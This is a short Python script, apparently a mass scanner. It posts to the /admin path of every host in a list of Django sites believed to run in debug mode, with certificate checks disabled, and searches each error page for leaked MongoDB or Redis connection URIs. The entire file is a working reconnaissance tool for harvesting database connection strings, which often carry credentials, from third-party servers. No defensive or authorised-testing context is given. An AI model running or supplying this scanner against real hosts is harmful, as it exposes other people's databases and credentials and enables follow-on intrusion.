import requests
import re
django_debug_list = open("django-debug-list.txt","r")
regex = r"(?:mongodb|redis):\/\/"
for ip in django_debug_list.readlines():
    try:
        response = requests.post(url=ip.rstrip("\n")+"/admin",data={},verify=False)
        if re.search(regex,response.content.decode()):
            print("Mongodb/Redis URI found")
            print("ip: " + ip.rstrip("\n")+"/admin")
    except Exception as e:
        print(e)